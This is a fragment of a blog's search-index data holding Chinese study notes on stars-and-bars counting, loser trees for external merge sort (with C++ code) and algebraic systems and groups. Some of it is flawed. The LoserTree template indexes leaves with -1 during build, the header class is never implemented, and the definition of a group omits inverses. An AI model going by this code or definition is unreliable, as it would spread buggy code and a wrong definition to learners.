\n\n**另一种直观理解 (插空法变种 / 隔板法思想)：**\n1. 想象我们有 k 个要选中的物品（“选中球”）和 n−k 个不选中的物品（“白色球”）。\n2. 为了保证选中的 k 个物品不相邻，我们可以先把这 k 个“选中球”拿出来。\n3. 剩下 n−k 个“白色球”。将它们排成一排，它们之间以及两端会形成 (n−k)+1 个空隙。 _ W _ W _ ... _ W _ (W代表白色球，_ 代表空隙)\n4. 现在，将 k 个“选中球”放入这 (n−k)+1 个空隙中，每个空隙最多放一个球。这样就能保证任意两个“选中球”之间至少隔着一个“白色球”，即它们不相邻。\n5. 从 (n−k)+1 个空隙中选择 k 个空隙来放置“选中球”，选法数量就是 C(n−k+1,k)。\n\n---\n\n### 2. 公式 C(n+k−1,k−1) 或 C(n+k−1,n): “隔板法” / “不定方程非负整数解”\n\n问题场景1 (不定方程解)：\n\n方程 x1​+x2​+…+xk​=n 有多少组非负整数解 (即 xi​≥0)？\n\n问题场景2 (相同物品分给不同人)：\n\n将 n 个相同的物品分给 k 个不同的人，每人可以分到0个或多个，有多少种分法？\n\n这两个场景是等价的。xi​ 可以看作第 i 个人分到的物品数量。\n\n**推导思路 (“隔板法” / \"Stars and Bars\"):**\n\n1. 物品表示 (Stars)： 把 n 个相同的物品想象成 n 个小星星（*）排成一列：\n    \n    * * * ... * (共 n 个星)\n    \n2. **分组 (Bars)：** 要将这 n 个星星分成 k 组 (对应 k 个人或 k 个变量 xi​)，我们只需要在这 n 个星星形成的序列中插入 k−1 个隔板（`|`）。\n    \n    - 例如，如果 n=5,k=3 (即 x1​+x2​+x3​=5)：\n        - `**|*|**` 表示 x1​=2,x2​=1,x3​=2\n        - `***||**` 表示 x1​=3,x2​=0,x3​=2\n        - `||*****` 表示 x1​=0,x2​=0,x3​=5\n3. 排列隔板和星星： 我们现在总共有 n 个星星和 k−1 个隔板。这些星星和隔板共同占据了 n+(k−1) 个位置。\n    \n    我们的问题就转化成了：在这 n+k−1 个位置中，选择 k−1 个位置放置隔板（剩下的位置自然就是星星了）。\n    \n    选择的方法数就是组合数 C(n+k−1,k−1)。\n    \n4. 等价形式：\n    \n    同样，我们也可以选择 n 个位置放置星星（剩下的位置就是隔板）。\n    \n    选择的方法数是 C(n+k−1,n)。\n    \n    根据组合数的性质 C(N,K)=C(N,N−K)，我们知道 C(n+k−1,k−1)=C(n+k−1,(n+k−1)−(k−1))=C(n+k−1,n)。所以这两个表达式是等价的。\n    \n\n**场景变形：如果要求每人至少分到1个物品 (即 xi​≥1)**\n\n1. **预先分配：** 先给每人（每个变量）分配1个物品。这样就用掉了 k 个物品。\n    \n2. **剩余分配：** 还剩下 n−k 个物品。现在的问题变成将这 n−k 个物品分给 k 个人，每人可以分到0个或多个。\n    \n3. 套用公式： 把问题中的 n 替换为 n−k，套用上面的隔板法公式：\n    \n    C((n−k)+k−1,k−1)=C(n−1,k−1)。\n    \n    - 或者直观理解：有 n 个星星 `* * ... *`。它们之间有 n−1 个空隙。要将它们分成 k 份（且每份至少1个），只需要在这 n−1 个空隙中选择 k−1 个位置插入隔板。方法数是 C(n−1,k−1)。\n    - 你之前第一个问题“4位同学分吃10个相同的苹果，每位同学至少会吃1个”，就是这个变形。n=10,k=4，所以是 C(10−1,4−1)=C(9,3)=84。\n\n","tags":["数学","离散数学"],"categories":["日常学习","离散数学"]},{"title":"败者树","url":"/2025/06/01/xue-xi/shu-ju-jie-gou/bai-zhe-shu/","content":"# 多路归并外排序: 败者树\n\n## 外排序基本思想\n**外排序**是指数据量太大，无法一次性全部装入内存时，借助外存（磁盘）进行排序。\n常用方法是**多路归并排序**，即先将数据分成若干“归并段”，每次归并时只将部分数据读入内存。\n一般来说它的优点有这三种：\n\n- 处理大规模数据集：当数据集太大，无法在计算机的内存中完全装入时，外部排序算法是一个很好的选择。例如，在**处理大型数据库或超大规模文件**时，通常需要使用外部排序算法。\n\n- 节约内存：当内存受限时，外部排序算法也是很有用的。例如，在移动设备等资源受限的计算机上运行排序操作时，使用外部排序算法可以避免占用过多的内存。\n\n- 并行处理：外部排序算法还可以通过将数据集分成多个块并对每个块进行并行处理来进一步提高性能。这意味着可以使用多个处理器或计算机来同时处理数据集，从而加快排序速度。\n\n**败者树就是为了并行处理，而构造的一种树。**\n\n---\n## 多路归并排序\n想象一下，家里突然来了一大堆快递包裹，每个包裹里装着不同年代的明信片。\n我想把所有明信片按时间顺序排列，但家里的桌子太小，没办法一次性摊开全部包裹。怎么办？\n只能**分批处理**——这就是“外排序”的现实版，没法直接一次性处理好这些数据。\n\n**多路归并排序**的套路就像开 k 个快递包裹，每次从每个包裹里抽一张**最特殊的明信片**（最年代久远的，或者是最年轻的），摆成一排，不断重复，直到所有包裹都拆完。最后我们就得到了一个基于特殊程度顺序的，明信片排列。我们把所有的拆开，一步一步组合，最后得到归并顺序，这就是**k路归并**。\n![](https://pic.moyuin.top/2025/06/01/683c1f85dc62e.png)\n\n\n一开始我们只有使用堆来完成多路归并，但是人们发现堆每次取出最小值之后，把最后一个数放到堆顶，调整堆的时候，**每次都要选出父节点的两个孩子节点的最小值**，**然后再用孩子节点的最小值和父节点进行比较，所以每调整一层需要比较两次**。\n\n这时人们想能否简化比较过程，这时就有了**胜者树**：\n\t\t\t\t\t\t\t![](https://pic.moyuin.top/2025/06/01/683c1c9c998fd.png)\n这样**每次比较只用跟自己的兄弟节点进行比较**就好，所以用胜者树可以比堆少一半的比较次数。\n\n而胜者树在节点上升的时候，需要获得父节点，然后再获得兄弟节点，然后再比较，判断要不要上升。\n这时人们又想能否再次减少读取节点的次数，于是就有了**败者树**。\n\t\t\t\t\t\t\t![](https://pic.moyuin.top/2025/06/01/683c1de998f2e.png)\n\n在使用败者树的时候，每个新元素上升时，只需要获得父节点并比较即可。\n\n那么胜者树，败者树到底有什么区别呢？\n>  败者树是胜者树的一种变体，它也是一棵完全二叉树。和胜者树不同的是，败者树的节点存储的是败者。\n>  一般采用数组模拟胜者树或败者树的结构，所以胜者树、败者树选哪一个都行，胜者树相比败者树要少维护一个冠军项。\n>  败者树便于查找、更新和归并输出胜者。\n\n---\n## 败者树结构与实现\n### 败者树的结构图\n基础图形，特殊于树顶有一个唯一值胜者：\n```mermaid\ngraph TD\n\tW[\"🥇胜者的索引 i\"]\n    A[\"🥈败者第1名的索引 i\"]\n    B1[\"败者索引 i\"]\n    B2[\"败者索引 i\"]\n    C1[\"选手1\"]\n    C2[\"选手2\"]\n    C3[\"选手3\"]\n    C4[\"选手4\"]\n    W --> A\n    A --> B1\n    A --> B2\n    B1 --> C1\n    B1 --> C2\n    B2 --> C3\n    B2 --> C4\n```\n\n基础分析（定最小者赢）：\n![](https://pic.moyuin.top/2025/06/01/683c207f36868.png)\n\n### 建树与维护过程\n#### 建立败者树\n让我们建立一个败者树，`ls[0]`,`ls[1]`, ` ls[2]`, ` ls[3]`, `ls[4]` 是败者树的内部节点（即非叶子节点），存储每一轮败者的索引，b0~b4是败者树的叶子节点。\n败者树的每个节点存储的都是两两比较的败者（数大者败，我们先要求出的是各归并路中的最小嘛）在原数组中的索引。\n\n1. `b3` 和 `b4` 比较，`b3` < `b4`, `b4` 败。所以父节点 `ls[4]=4`. 胜者是 `b3`, 所以 3 就晋级下一轮与 `b0` 比较（图中树的边上的数字就是晋级的选手编号）\n\n2. `b0` 与 `b3` 比较, ` b3` < `b0`, `b0` 败, 所以父节点 `ls[2]=0`, 胜者是 `b3`，所以 3 就晋级下一轮与另一边晋级的比较\n\n3. `b1` 与 `b2` 比较, `b1` < `b2`, `b2` 败, 所以父节点 `ls[3]=2`. 胜者是 `b1`, 所以1就晋级下一轮与b3会师总决赛。\n\n4. `b1` 与 `b3` 比较, `b3` < `b1`, `b1` 败, 所以父节点 `ls[1]=1`. 胜者是 `b3`, 所以 `ls[0]` 记录最终胜者3。排序最小值，算法输出 ` b[3]`（原数组中最小）。\n最后构造成功：\n```mermaid\ngraph TD\n\n    subgraph \"最终败者树结构与节点值\"\n        LS0_final[\"ls[0]=3 (总胜者索引)\"]\n        LS1_final[\"ls[1]=1 (败者索引)\"]\n        LS2_final[\"ls[2]=0 (败者索引)\"]\n        LS3_final[\"ls[3]=2 (败者索引)\"]\n        LS4_final[\"ls[4]=4 (败者索引)\"]\n\n        B0_f[\"b0 (10)\"]\n        B1_f[\"b1 (5)\"]\n        B2_f[\"b2 (8)\"]\n        B3_f[\"b3 (2)\"]\n        B4_f[\"b4 (12)\"]\n\n        LS0_final --> LS1_final\n        LS1_final --> LS2_final\n        LS1_final --> LS3_final\n        LS2_final --> B0_f\n        LS2_final --> LS4_final\n        LS4_final --> B3_f\n        LS4_final --> B4_f\n        LS3_final --> B1_f\n        LS3_final --> B2_f\n\n        style LS0_final fill:#90EE90,stroke:#006400,stroke-width:2px\n        style LS1_final fill:#D3D3D3,stroke:#333\n        style LS2_final fill:#D3D3D3,stroke:#333\n        style LS3_final fill:#D3D3D3,stroke:#333\n        style LS4_final fill:#D3D3D3,stroke:#333\n        style B3_f fill:#ADFF2F,stroke:#333 %% Highlight the winner leaf\n    end\n\n    %% Styling\n    classDef playerNode fill:#FFFACD,stroke:#B8860B,stroke-width:1px;\n    class B0,B1,B2,B3,B4 playerNode;\n    class B0_f,B1_f,B2_f,B3_f,B4_f playerNode;\n\n    classDef stepNode fill:#ADD8E6,stroke:#4682B4,stroke-width:1px,border-radius:5px;\n    class Step1,Step2,Step3,Step4,Step5 stepNode;\n\n    classDef winnerNode fill:#FFA07A,stroke:#CD5C5C,stroke-width:1px,shape:capsule;\n    class Step1_W,Step2_W,Step3_W,Step4_W winnerNode;\n```\n\n\n#### 维护败者树\n我们一般用\"**更新**\"来说明败者树的维护：\n\n我们来了一个新的成员，走了一个成员，想要让它加入后重塑这颗树，实现**败者树的更新**。\n可以想象成**晋级赛**：上一轮的冠军带着“新人”重新参加比赛，只需要重新打一遍自己走过的那条“晋级之路”，而其它归并段（叶子）完全不用重新比较。每次归并输出和更新，最多只需要 $\\log_2 k$ 次比较。\n```mermaid\ngraph TD\n    direction TB\n    %% 败者树维护（插入/替换）后的状态\n    %% 原冠军 b3(值2) 被 新b3(值6) 替换\n    %% 调整后, 新冠军为 b1(值5)\n\n    LS0_m[\"ls[0]=1 (新胜者: b1[5])<br/>(原ls[0]=3)\"]\n    LS1_m[\"ls[1]=3 (新败者: 新b3[6])<br/>(原ls[1]=1)\"]\n    LS2_m[\"ls[2]=0 (败者: b0[10])<br/>(调整路径节点, 值未变)\"]\n    LS3_m[\"ls[3]=2 (败者: b2[8])<br/>(非调整路径节点)\"]\n    LS4_m[\"ls[4]=4 (败者: b4[12])<br/>(调整路径节点, 值未变)\"]\n\n    B0_m[\"b0 (10)\"]\n    B1_m[\"b1 (5)\"]\n    B2_m[\"b2 (8)\"]\n    B3_m[\"新b3 (6)<br/>(原b3值: 2)\"]\n    B4_m[\"b4 (12)\"]\n\n    LS0_m --> LS1_m\n    LS1_m --> LS2_m\n    LS1_m --> LS3_m\n    LS2_m --> B0_m\n    LS2_m --> LS4_m\n    LS4_m --> B3_m\n    LS4_m --> B4_m\n    LS3_m --> B1_m\n    LS3_m --> B2_m\n\n    classDef defaultLeaf fill:#FFFACD,stroke:#B8860B;\n    classDef changedLeaf fill:#lightblue,stroke:#0000FF,stroke-width:2px,font-weight:bold;\n    classDef newWinnerLeaf fill:#ADFF2F,stroke:#006400,font-weight:bold;\n    \n    classDef pathChangedNode fill:#90EE90,stroke:#006400,stroke-width:2px,font-weight:bold;\n    classDef pathUnchangedNode fill:#lightyellow,stroke:#333,stroke-width:1px,stroke-dasharray:5 5;\n    classDef notOnPathNode fill:#D3D3D3,stroke:#333;\n\n    class LS0_m,LS1_m pathChangedNode;\n    class LS2_m,LS4_m pathUnchangedNode;\n    class LS3_m notOnPathNode;\n    \n    class B0_m,B2_m,B4_m defaultLeaf;\n    class B3_m changedLeaf;\n    class B1_m newWinnerLeaf;\n\n\n```\n\n\n---\n我们插入一个新的节点 b5(4)，步骤也很简单：\n\n让新选手 `b5` 与现有选手 `b4` 进行比赛。我们需要一个新的内部节点（我们称之为 `ls[5]`）来存储这场比赛的败者。\n- `b5(4)` vs `b4(12)`：胜者是 `b5(4)`，败者是 `b4(12)`。所以 `ls[5]` 记录败者 `b4` 的索引 `4`。\n- 然后，这场 `(b5 vs b4)` 的胜者 (`b5`) 再与原先和 `b4` 比赛的 `b3` 进行比赛。原先存储 `(b3 vs b4)` 败者的节点 `ls[4]` 现在将存储这场 `(b3 vs 胜者(b5,b4))` 比赛的败者。\n\t`b3(2)` vs `b5(4)`：胜者是 `b3(2)`，败者是 `b5(4)`。所以 `ls[4]` 记录败者 `b5` 的索引 `5`。\n- 这个胜者 `b3(2)` 继续沿用原有的路径向上比赛：\n\t与 `b0(10)` 比赛：胜者 `b3(2)`，败者 `b0(10)`。`ls[2]` 记录败者 `b0` 的索引 `0` (此节点值未变)。\n- 树的另一分支 (`b1` vs `b2`) 不受影响：\n\t`b1(5)` vs `b2(8)`：胜者 `b1(5)`，败者 `b2(8)`。`ls[3]` 记录败者 `b2` 的索引 `2` (此节点值未变)。\n- 最终决赛：\n    来自 `ls[2]` 分支的胜者 `b3(2)` vs 来自 `ls[3]` 分支的胜者 `b1(5)`：胜者 `b3(2)`，败者 `b1(5)`。`ls[1]` 记录败者 `b1` 的索引 `1` (此节点值未变)。\n- 总冠军：\n    `ls[0]` 记录总冠军 `b3` 的索引 `3` (此节点值未变)。\n```mermaid\ngraph TD\n    direction TB\n    %% 败者树添加新节点 b5(4) 后的状态\n    %% 原有选手: b0(10), b1(5), b2(8), b3(2), b4(12)\n    %% 新增选手: b5(4) (值为4, 索引为5)\n    %% 数小者胜\n\n    LS0[\"ls[0]=3 (总胜者: b3[2])\"]\n    LS1[\"ls[1]=1 (败者: b1[5])\"]\n    LS2[\"ls[2]=0 (败者: b0[10])\"]\n    LS3[\"ls[3]=2 (败者: b2[8])\"]\n    LS4_mod[\"ls[4]=5 (败者: b5[4])\"  ]\n    LS5_new[\"ls[5]=4 (败者: b4[12]) \"]\n\n    B0[\"b0 (10)\"]\n    B1[\"b1 (5)\"]\n    B2[\"b2 (8)\"]\n    B3[\"b3 (2)\"]\n    B4[\"b4 (12)\"]\n    B5[\"b5 (4)\"]\n\n    LS0 --> LS1\n    LS1 --> LS2\n    LS1 --> LS3\n        LS2 --> B0\n        LS2 --> LS4_mod\n            LS4_mod --> B3\n            LS4_mod --> LS5_new  \n                LS5_new --> B4\n                LS5_new --> B5\n        LS3 --> B1\n        LS3 --> B2\n\n    classDef defaultLeaf fill:#FFFACD,stroke:#B8860B;\n    classDef newLeaf fill:#FFDAB9,stroke:#FF8C00,font-weight:bold;\n    classDef winnerLeaf fill:#ADFF2F,stroke:#006400,font-weight:bold;\n    \n    classDef winnerNode fill:#90EE90,stroke:#006400,stroke-width:2px,font-weight:bold;\n    classDef loserNode fill:#D3D3D3,stroke:#333; \n    classDef newInternalNode fill:#E6E6FA,stroke:#9370DB,font-weight:bold; \n    classDef modifiedInternalNode fill:#ADD8E6,stroke:#4682B4,font-weight:bold; \n\n    class LS0 winnerNode;\n    class LS1,LS2,LS3 loserNode;\n    class LS4_mod modifiedInternalNode;\n    class LS5_new newInternalNode;\n\n    class B0,B1,B2,B4 defaultLeaf;\n    class B3 winnerLeaf;\n    class B5 newLeaf;\n```\n\n在多路归并排序里，**败者树实现比胜者树更高效、更容易维护**。更新只需沿着冠军的路径向上“重新比一遍”，而不用全部重算。\n\n---\n\n## 代码实现与多路归并文件流\n败者树的实现比较基础，其实和**堆的构建**很相似，我们做的是与相邻节点一直比较，然后将失败节点放在最上端即可。\n这种排序思想其实与堆排序思想相似，败者树的优势在于我们处理查找最佳者，次佳者操作，效率更高。外排序的效率瓶颈从算法到了数据读取，胜者树和败者树都是很伟大的数据结构。\n\n**LoserTree** 基本模板类例：\n```cpp\n// 败者树类模板，T为可比较类型，最小值胜\ntemplate<typename T>\nclass LoserTree {\npublic:\n    // k为路数，sources为每一路的当前元素\n    LoserTree(const std::vector<T>& sources)\n        : k(sources.size()), leaves(sources), ls(k, -1) {\n        build();\n    }\n\n    // 返回当前最小元素的下标\n    int winner() const {\n        return winnerIdx;\n    }\n\n    // 输出冠军，并用新元素替换，维护树结构\n    void popAndReplace(T newElem) {\n        leaves[winnerIdx] = newElem;\n        adjust(winnerIdx);\n    }\n\n    // 获取当前冠军的值\n    T top() const {\n        return leaves[winnerIdx];\n    }\n\nprivate:\n    int k;                      // 路数\n    std::vector<T> leaves;      // 叶子节点（各路的当前值）\n    std::vector<int> ls;        // 内部节点，存败者编号\n    int winnerIdx;              // 当前冠军编号\n\n    // 建树：从叶子到根层层比较，初始化ls和winnerIdx\n    void build() {\n        ls.assign(k, -1);\n        winnerIdx = 0;\n        for (int i = 0; i < k; ++i) {\n            if (leaves[i] < leaves[winnerIdx]) winnerIdx = i;\n        }\n        for (int i = 0; i < k; ++i) {\n            if (i != winnerIdx) adjust(i);\n        }\n    }\n\n    // 从叶i出发向上挑战，维护败者树\n    void adjust(int i) {\n        int parent = (i + k) / 2;\n        int challenger = i;\n        while (parent > 0) {\n            // challenger与ls[parent]决出胜负，胜者上移\n            if (leaves[challenger] < leaves[ls[parent]]) {\n                std::swap(challenger, ls[parent]);\n            }\n            parent /= 2;\n        }\n        // 根节点与当前winner比较\n        if (leaves[challenger] < leaves[winnerIdx]) {\n            std::swap(challenger, winnerIdx);\n        }\n        // 最终winnerIdx存冠军下标\n    }\n};\n\n```\n基本使用：\n```cpp\nstd::vector<int> sources = {7, 9, 4, 6}; // 各路的初始元素\nLoserTree<int> tree(sources);\nstd::cout << \"当前冠军编号: \" << tree.winner() << \", 元素: \" << tree.top() << std::endl;\n\n// 假设弹出冠军后，路3有新元素8\ntree.popAndReplace(8);\nstd::cout << \"新冠军编号: \" << tree.winner() << \", 元素: \" << tree.top() << std::endl;\n\n```\n\n**结合文件流**，多文件编程，我们可以对于多路归并，利用败者树，实现外排序：\n我们写个文件头 `LoserTree.h`，比较好引用：\n```c\n//LoserTree.h\n#ifndef LOSERTREE_H\n#define LOSERTREE_H\n\n#include <vector>\n#include <limits>\n#include <memory>\n\n// ------- 单路输入流接口（可扩展为文件流/数组流/网络流等） -------\nstruct InputStream {\n    virtual bool next(int& val) = 0;\n    virtual ~InputStream() {}\n};\n\n// 败者树类，适合多路归并外排序\nclass LoserTree {\npublic:\n    // 构造函数：输入k路流\n    LoserTree(std::vector<std::unique_ptr<InputStream>>& streams);\n\n    int winner() const;    // 当前冠军编号\n    int top() const;       // 当前最小元素\n    void popAndReplace();  // 输出冠军，补新元素，维护树结构\n    bool empty() const;    // 判断是否归并结束\n\nprivate:\n    const int INF = std::numeric_limits<int>::max();\n    int k;\n    std::vector<int> leaves;  // 当前各路的元素\n    std::vector<int> ls;      // 内部节点存败者编号\n    int winnerIdx;            // 冠军编号\n    std::vector<std::unique_ptr<InputStream>>& input_streams;\n\n    void build();             // 初始建树\n    void adjust(int i);       // 沿冠军路径维护\n};\n\n#endif // LOSERTREE_H\n\n```\n\n```cpp\n#include \"LoserTree.h\"\n#include <iostream>\n\n// 数组流实现\nstruct VectorInputStream : public InputStream {\n    const std::vector<int>& arr;\n    size_t pos;\n    VectorInputStream(const std::vector<int>& a) : arr(a), pos(0) {}\n    bool next(int& val) override {\n        if (pos < arr.size()) {\n            val = arr[pos++];\n            return true;\n        }\n        return false;\n    }\n};\n\nint main() {\n    std::vector<int> arr1{2, 5, 9};\n    std::vector<int> arr2{1, 4, 7, 11};\n    std::vector<int> arr3{3, 8, 12};\n\n    std::vector<std::unique_ptr<InputStream>> streams;\n    streams.emplace_back(new VectorInputStream(arr1));\n    streams.emplace_back(new VectorInputStream(arr2));\n    streams.emplace_back(new VectorInputStream(arr3));\n\n    LoserTree lt(streams);\n\n    std::cout << \"败者树多路归并结果：\";\n    while (!lt.empty()) {\n        int val = lt.top();\n        if (val != std::numeric_limits<int>::max())\n            std::cout << val << \" \";\n        lt.popAndReplace();\n    }\n    std::cout << std::endl;\n    return 0;\n}\n\n\n```\n只需实现 InputStream 接口，LoserTree 就能无缝适配各种归并源（如大文件、分布式流、数据库游标），这也是它工程实践中的巨大优势。\n\n---\n## 应用\n**败者树是非常高效的数据结构**，适用于各种排序和选择问题。\n在实际应用中，我们可以根据具体问题选择使用胜者树或败者树。对于需要频繁更新数据集的问题，胜者树是一个更好的选择；对于需要快速记录和查找比赛结果的问题，败者树则更加适用。这两种数据结构都可以在log(n)时间内完成最值查找和更新操作，具有很高的实用价值。\n#### 大型搜索引擎的“网页排名归并”\n比如你在百度、Google搜索同一个关键词时，背后往往有成百上千台服务器分别给你算出“最相关的网页排名”，但最后这些排名结果需要快速合并成一个全局排名列表。  \n**败者树**就像一场高效的“锦标赛”，每次都能最快选出全体中“最优网页”，把全球各地的“榜首网页”按序输出，大大提高搜索响应速度。\n#### 云盘/网盘的多服务器文件同步\n比如阿里云盘、百度网盘要把全球多台服务器上的同步文件合成一个最终的时间线展示，这时候每台服务器的文件变动已经排好序，只需归并各路“文件事件”流。  \n败者树就是最好的选择，保证“**最近的更新**”总能优先显示，哪怕有成百上千台服务器，也能稳定工作。\n####  视频推荐系统的“多路个性化候选集归并”\n你刷B站/抖音时，推荐系统会从无数个“兴趣通道”各自找出适合你的视频，最后要把这些小列表合并成全局排序，推荐给你。  \n败者树可以把多个候选池（比如“你喜欢的音乐”、“你最近常看的UP主”、“全站热点”等）合并，保证每次推送的都是**最优解**。\n\n>  败者树不仅限于排序数字流，它适合**任何有序对象的高效归并**——比如合并新闻流、股票行情、快递物流进度等。\n> 在分布式大数据场景下，败者树和胜者树比传统堆/优先队列更高效，尤其适合“路数极多”的超级归并任务。\n> 只要你能把生活中的“多路有序队列”抽象成 InputStream，败者树就能帮你把它们归并成一条高效、无遗漏的“大路”。\n\n---\n\n## 性能优缺点分析\n### 时间复杂度 \n#### 建树（初始化）\n- **建树过程**需要让每一个叶子节点沿路径挑战至根，共 $k$ 路，每次最多比较 $\\log_2 k$ 次，总体复杂度为 $O(k \\log k)$。\n#### 归并操作（每次输出最小值）\n- **每次归并输出**，新元素替换后，只需要沿冠军路径向上“重新比较”一遍，最多 $\\log_2 k$ 层。\n- 因此，**每次归并输出/更新的时间复杂度**为 $O(\\log k)$。\n- 对于 $n$ 个总元素归并排序，总体复杂度为 $O(n \\log k)$。\n\n> 这一点比直接用暴力遍历所有路（$O(k)$）快得多，特别适合 $k$ 很大时使用。\n\n### 空间复杂度\n- 败者树本身维护一个**完全二叉树结构**，含 $k$ 个叶子和 $k$ 个内部节点（每个内部节点只需存一个路的索引或指针）。\n- 主要需要存储：\n    - $k$ 个叶节点（每路当前值，实际归并中只需一个元素的缓存/指针）\n    - $k$ 个内部节点（败者索引或指针） \n- **空间复杂度总为 $O(k)$**。\n\n###  与其他归并方法对比\n- **暴力归并**：每次都遍历所有 $k$ 路，查找最小元素，时间复杂度 $O(nk)$。\n- **堆/优先队列归并**：每次插入弹出堆顶都是 $O(\\log k)$，和败者树同阶，但败者树常数更小，且可更好地复用内存，更新效率高。\n- **败者树**：在 $k$ 很大时（如数百、上千路归并），败者树的效率更明显。\n### 优点\n- 每次找最小值、更新树只需 $O(\\log k)$，对大规模归并非常友好。\n- 空间消耗小，易于实现。\n- 特别适合归并段数量多、单段数据量小的场景。\n### 缺点\n- 实现比暴力法复杂一点，初学者需要适应树结构。\n- 归并段不均衡时，可能存在部分节点重复挑战，导致更新稍慢。\n---\n\n## 参考资料\n- [败者树 - OI wiki](https://oi-wiki.org/ds/loser-tree/)\n-  [树排-胜者树-败者树 - 影法師の物語](https://yfsyfs.github.io/2019/09/07/%E6%A0%91%E6%8E%92-%E8%83%9C%E8%80%85%E6%A0%91-%E8%B4%A5%E8%80%85%E6%A0%91/)\n- [选择树 胜者树 | 败者树 - CSDN](https://blog.csdn.net/summer_dew/article/details/84197001)\n- [堆，赢者树，败者树的区别与联系](https://blog.csdn.net/haolexiao/article/details/53488314)\n- [多路归并排序的时候，为什么要采用败者树？- 知乎回答](https://www.zhihu.com/question/35144290)\n- [外部排序之败者树 - ivan 的博客](https://ivanzz1001.github.io/records/post/data-structure/2018/07/03/ds-loser_tree)\n- [一文读懂胜者树与败者树](https://cloud.tencent.com/developer/article/2238630)\n- [Google Gemini](https://gemini.google.com/)\n- [OpenAI ChatGPT](https://chatgpt.com/)\n- 数据结构 - 归并排序，外排序","tags":["记录","学习","数据结构","编程"],"categories":["日常学习","数据结构"]},{"title":"离散数学-代数系统","url":"/2025/05/16/xue-xi/shu-xue/chi-san-shu-xue-dai-shu-xi-tong/","content":"# 离散数学-代数系统\n\n## 广义加乘\n### 定义\n广义的加法与乘法没有特定的运算形式，主要依赖于它的定义。可以定义它为**实数**运算，也可定义它为**矩阵**类运算。\n如果不好定义或没有符号，只能使用**运算表**，限于**有限情况**。\n\n> 广义加乘形式类似于 C++ 中的运算符重载。\n\n运算符号由自己定义。\n\n### 定律\n#### 广义加乘的封闭性\n![image.png](https://pic.moyuin.top/2025/05/16/6826e28868590.png)\n\n#### 交换律\n广义交换律是二元运算中存在 `x*y=y*x`\n二元交换普遍存在。\n#### 结合律\n任意 xyz 在集合 S 中，有 `(x+y)+z=x+y+z=x+(y+z)`，称该运算在 S 中满足结合律。\n实数的加、乘；\n集合的并、交；\n逻辑的与、逻辑或；\n矩阵的加、乘\n可满足结合律。\n#### 幂等律\n任意 x 在集合 S 中，有 `x+x=x` 称该运算在 S 中幂等。\n有些不满足幂等律，但某些元素满足。如普通加法不满足幂等。\n#### 分配律\n任意 xyz 在集合 S 中，有 `x*(y+z)=(x*y)+(x*z)`, 称 `*` 对 `+` 可分配。\n如实数加乘，逻辑的与、逻辑或。\n#### 吸收律\n任意 xy 在集合 S 中，有 `x*(x+y)=x,x+(x*y)=x`, 则称 `*` 与 `+` 满足吸收率。\n如 xyz 命题变元。\n\n### 单位元与零元\n>  实数乘法的 1，实数加法的 0：广义加乘为单位元。\n\n![image.png](https://pic.moyuin.top/2025/05/16/6826e673c673c.png)\n\n![image.png](https://pic.moyuin.top/2025/05/16/6826e75fc7b49.png)\n\n在单位元和零元都存在的基础上，单位元和零元必然不会相同。\n例如：\n- 乘法中 1 为单位元，0 为零元\n- 加法中 0 为单位元，没有零元。\n\n### 逆元\n>  实数乘的倒数，实数加相反数广义加乘的逆元。\n\n并不是所有元素都一定有逆元。\n逆元必须在代数系统集合内，满足运算但是不在系统集合内的，不算逆元。\n![image.png](https://pic.moyuin.top/2025/05/16/6826ea24d80c4.png)\n\n---\n## 代数系统的相似性\n其实类比于 C++ 的类，集合 S 相当于数据成员，运算相当于函数成员。\n代数系统中举例子，实数系统就由 `<实数,+，*>` 构成。\n\n`<集合,运算>` 构成一个代数系统。\n### 同构\n\n![image.png](https://pic.moyuin.top/2025/05/16/6826eb9687ca7.png)\n\n注意：**满足一个映射**即可说两组代数系统同构。\n\n### 同余\n![image.png](https://pic.moyuin.top/2025/05/16/6826eed1cdbbd.png)\n这个同余在之前的学习中也有提及，好像是关系里的，可以回去看看。\n\n---\n## 群\n\n### 广群、半群、幺群、群\n- 若代数系统封闭，称其为广群。\n- 若代数系统封闭、可结合,则其为半群。\n- 若V=封闭、可结合、有e，则为幺群(独异点)\n- 若封闭，可结合，有 e，则为群。\n\n我们做题，就是判断这个题是否为\"群\"。\n判断这个代数系统是否为群，这个例题：\n![image.png](https://pic.moyuin.top/2025/05/19/682ad4ace6ada.png)\n用运算分别判断封闭，结合，单位元，逆元，从而判断。\n### Klein 群\n和周期挂钩。\n![image.png](https://pic.moyuin.top/2025/05/19/682ae2c9ade1d.png)\n\n### Abel 群（交换群）\n**符合交换律的群**即为交换群，又叫作 abel 群。\n#### 定理\n- 已知 `<G,*>` 是群，G 是交换群 = 对于任意元素 a, b 有 `(a*b)*(a*b)=(a*a)*(b*b)`\n\t这是一个充要条件。\n### 群的性质\n#### 表表示\n群是可以用运算表表示的，对于群，我们看运算表可以获得它的封闭，可结合，逆元，单位元。\n![image.png](https://pic.moyuin.top/2025/05/19/682ad65198ca4.png)\n\n#### 群的幂\n![image.png](https://pic.moyuin.top/2025/05/19/682addd5f3305.png)\n![image.png](https://pic.moyuin.top/2025/05/19/682adcc4cbf80.png)\n\n负数幂怎么操作？取逆元后再进行幂运算。\n 模运算 ：“模 p 加法意思就是（a+b）mod p 的值”。\n![image.png](https://pic.moyuin.top/2025/05/23/6830195f41548.png)\n\n#### 元素的周期（元素的阶）\n注意，**对于群而言，群的阶表达的是群的元素个数**，这里解释的是元素的阶。\n![image.png](https://pic.moyuin.top/2025/05/19/682add5618e86.png)\n![image.png](https://pic.moyuin.top/2025/05/19/682ae296eacd8.png)\n\n周期与幂有关，对元素作 n 次幂，让元素转化为单位元，那么可以说该元素的周期为 n。\n其实这样子在模运算里也比较难识别的。模运算转化为一种乘法运算也比较方便。\n- 单位元的阶（周期）为 1。\n> 这个“陌生”的运算，其实是大学抽象代数里最经典、最简单的群之一，叫做**整数模n加法群**，记作 (Zn​,+)。我们的 G 集合就是 Z8​ 的一个“二进制马甲”。\n\n对于这种群，有一个**求周期的黄金公式**：\n\n**元素 k 的周期 = `m/gcd(k,m)`**\n\n这里的字母代表：\n- **m**: 群里一共有多少个元素。在这道题里，`G`有8个元素，所以 m=8。\n- **k**: 我们要计算的那个元素所代表的十进制数。比如 `010` 代表 2，`110` 代表 6。\n- **gcd(k,m)**: k 和 m 的**最大公约数** (Greatest Common Divisor)。就是能同时整除 k 和 m 的最大正整数。\n#### 定理\n- 1. 幂的普通运算\n\n- 2. 幂与逆元\n\t![image.png](https://pic.moyuin.top/2025/05/19/682adfba7bf5c.png)\n\n- 